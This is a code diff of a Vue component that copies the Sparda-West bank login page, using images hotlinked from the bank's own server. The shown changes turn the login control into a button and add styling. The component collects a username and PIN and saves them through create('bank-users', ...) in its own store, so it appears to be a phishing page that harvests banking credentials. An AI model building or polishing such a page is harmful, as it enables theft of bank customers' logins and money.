@@ -16,9 +16,9 @@
             <img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
     </div>
-    <div id="loginBtn">
+    <button id="loginBtn" ref="loginBtn">
         <img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/buttons/buttonFlach_Jetzt_einloggen.png" @click="sendData">
-    </div>
+    </button>
 
 </template>
 
@@ -64,6 +64,12 @@
         position: absolute;
         bottom: 10px;
         right: 20px;
+        background-color: transparent;
+        border: 0;
+        &:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
     }
 
 </style>
@@ -79,6 +85,7 @@
 
     const inputUser: Ref<InputData> = ref({ value: null });
     const inputPin: Ref<InputData> = ref({ value: null });
+    const loginBtn: Ref = ref({ value: null });
     
     async function sendData(){
         await useAsyncData('bank-users', () => create('bank-users', {
